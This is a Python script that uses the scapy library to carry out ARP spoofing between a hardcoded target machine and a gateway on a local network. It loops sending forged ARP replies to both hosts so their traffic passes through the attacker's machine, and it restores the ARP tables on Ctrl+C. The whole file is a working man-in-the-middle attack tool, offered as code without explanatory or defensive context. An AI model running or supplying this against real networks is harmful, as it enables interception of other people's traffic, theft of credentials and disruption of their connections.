#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc if answered_list else None

def spoof(target_ip, spoof_ip):
    try:
        target_mac = get_mac(target_ip)
        if target_mac:
            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
            scapy.send(packet, verbose=False)
        else:
            print(f"[-] Could not get target MAC address for {target_ip}")
    except Exception as e:
        print(f"[-] An error occurred: {e}")

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)
    else:
        print(f"[-] Could not get MAC addresses for restoration targets.")

target_ip = "192.168.0.166" #targetip set
gateway_ip = "192.168.0.115" #gatwayip set
sent_packets_count = 0

try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C. Resetting ARP tables. Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
